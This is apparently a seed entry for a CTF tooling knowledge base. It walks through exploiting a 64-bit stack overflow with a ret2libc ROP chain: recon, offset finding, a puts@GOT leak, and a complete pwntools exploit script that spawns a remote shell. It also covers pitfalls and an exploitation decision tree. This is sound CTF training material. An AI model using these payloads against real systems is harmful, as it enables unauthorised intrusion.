# [Seed] CTF Pwn: x64 Stack Overflow + ROP Chain Calling system

## Scenario Category
CTF / binary exploitation

## Target Overview
A 64-bit ELF with an out-of-bounds `read()` write into a stack buffer. The machine has NX (non-executable stack) but no PIE and no stack canary. Use ROP gadgets to call libc's `system("/bin/sh")` and get a shell.

## Full Execution Chain

1. Basic recon
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Look at main in IDA / Ghidra → found `read(0, buf, 0x100)` while `buf` is only 0x40 bytes
3. Calculate the overflow offset
   ```bash
   pwndbg> cyclic 200
   # Feed it to the target program, then inspect RSP after the crash
   pwndbg> cyclic -l 0x6161616c
   # offset = 72
   ```
4. Since there is no PIE, the PLT and GOT are at fixed addresses
5. Stage one (no libc information yet): leak the contents of `puts@GOT` to compute the libc base
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # Return to main for a second round of exploitation
   ```
6. Receive the puts output and identify the libc version (look it up with libc-database)
7. Stage two: build system("/bin/sh")
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. Get a shell → cat flag

## Pitfalls Encountered

| Problem | Cause | Solution | Time spent |
|------|------|---------|------|
| The program crashes after the ROP call to system, no shell | The stack was not 16-byte aligned (Ubuntu 18.04+ is strict about movaps) | Add a ret gadget before system as padding | 30min |
| Works locally but not against the remote | Mismatched libc versions | Leak a function address with puts → look up the exact version on libc-database | 40min |
| pwntools recv hangs | The program's output uses setbuf(NULL) but the remote does not disable stderr buffering | Synchronize precisely with sendlineafter / recvuntil | 15min |
| SIGPIPE as soon as the remote is hit | The stage-two payload was still using the io object from the previous round | After `process` / `remote`, io must reuse the same connection, once the main process dies it is over | 20min |
| ROPgadget output is overwhelming | The tool lists every gadget by default | Filter with `ROPgadget --binary vuln --only "pop\|ret"` | 5min |

## Toolchain Findings

- **pwntools** is the de facto standard for writing exploits in Python (`from pwn import *`)
- **pwndbg** is 10x more capable than stock GDB (ships cyclic / vmmap / heap commands)
- **ROPgadget** vs **ropper**: ropper's output is friendlier and it supports searching for syscall chains
- **libc-database** matches the exact libc version from a single leaked libc function address
- **one_gadget** finds a libc gadget that calls execve("/bin/sh") directly, shorter than hand-rolled ROP

## Key Code / Commands

Complete exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # Used for stack alignment

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Improvement Suggestions for This Package

- CTF-Sandbox-Orchestrator's `competition-reverse-pwn` should add `pwn-rop-cheatsheet.md`, turning this workflow into a template
- Add pwntools / pwndbg / one_gadget to the bootstrap manifest

## Reusable Patterns / Script Snippets

**ROP exploitation decision tree**:

```text
checksec → check the protections
├── No NX → drop shellcode directly (old-school approach)
├── NX + no PIE → classic ret2libc
├── NX + PIE + no Canary → leak the PIE base first → ret2libc
├── Canary present → find a way to leak the canary first (format string / off-by-one)
└── Full RELRO + Canary + PIE → hard, common approaches: fork not re-randomizing ASLR / __libc_start_main / SROP
```

**libc leak → exploitation: standard two-stage payload**:

```text
Stage 1: leak puts@GOT → compute libc base → return to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## Evolution Actions
- [ ] Add a pwn quick-reference page to the CTF orchestrator
- [ ] Add pwntools / pwndbg / one_gadget to bootstrap-manifest
- [ ] Reference this case in reverse-engineering/tools-dynamic.md

## Environment Information
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, pwndbg latest, ROPgadget 7.x
- libc versions: glibc 2.31 / 2.35 (common in CTFs)
- Target architecture: x86_64

## Redaction Requirements
This entry is seed data, written from publicly known CTF technical patterns, and does not involve any real competition challenge or closed-source system.
